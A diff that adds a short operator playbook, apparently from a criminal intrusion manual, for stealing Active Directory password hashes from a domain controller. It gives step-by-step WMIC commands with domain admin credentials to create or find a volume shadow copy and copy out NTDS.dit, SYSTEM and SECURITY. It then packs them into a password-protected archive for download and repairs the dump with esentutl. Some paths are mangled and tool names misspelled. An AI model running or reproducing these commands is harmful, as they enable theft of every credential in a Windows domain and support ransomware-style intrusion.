@@ -1,0 +1,22 @@
+Dump-free NTDS method 
+shell wmic /node:"DC01" /user:"DOMAINadmin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:log.txt"
+
+make a request for a listing of shadow copies, there is an indication of the date, check that the date is fresh
+almost certainly they are already there, if not then we do it ourselves.
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAINadmin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+then in the listing of shadow copies we find the latest
+Shadow Copy Volume: ?GLOBALROOTDeviceHarddiskVolumeShadowCopy55
+so we need the copy number for the next command
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"
+
+In c:templog the ntds.dit / security / system files should fall
+take a portable console 7z and pack in an archive with a password
+Code: [Highlight]
+
+7a.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -ptopsecretpassword 
+download a password-protected archive to ourselves, if when decrypting the file ntds we get an error (the file is damaged), 
+then we do the following ezentutl /n <unk>:logntds.dit
